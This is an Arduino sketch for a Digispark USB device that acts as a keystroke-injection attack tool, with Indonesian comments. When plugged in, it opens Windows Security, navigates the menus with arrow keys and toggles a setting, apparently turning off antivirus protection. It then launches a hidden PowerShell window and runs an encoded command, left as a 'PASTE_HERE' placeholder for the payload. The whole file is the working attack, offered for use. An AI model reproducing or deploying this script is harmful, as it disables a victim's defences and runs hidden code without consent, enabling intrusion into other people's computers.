#include "DigiKeyboard.h"
/* function init */
//script created by akbar
void setup()
{//LED akan mati saat kode sedang berjalan, ini berarti perangkat siap untuk dicabut apabila LED menyala kembali
  pinMode(1, OUTPUT); //LED di Model A
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(1000);
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_S);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("virus protection");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_R);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("PowerShell.exe -WindowStyle hidden");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell -e PASTE_HERE");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

/* endpoint loop */
void loop() {}
